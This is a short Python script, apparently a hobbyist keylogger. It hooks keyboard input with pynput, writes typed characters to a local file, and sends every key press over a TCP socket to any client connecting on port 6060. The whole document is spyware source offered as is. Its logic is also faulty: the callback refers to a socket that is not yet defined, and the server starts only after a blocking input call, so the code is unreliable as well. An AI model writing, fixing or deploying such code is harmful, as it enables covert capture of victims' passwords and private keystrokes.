#!/usr/bin/python3

import socket

from pynput import keyboard

def keyPressed(key):
    clientSocket.send(bytes(str(key),"utf-8"))
    with open("keyfile.txt",'a') as logKey:
        try: 
            char = key.char
            logKey.write(char)
        except:
            print('Error getting char')


if __name__ == '__main__':

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((socket.gethostname(), 6060))
    s.listen(5)

    while True:
        clientSocket, address = s.accept()
        print(f"Connection established from address {address}")

        
    





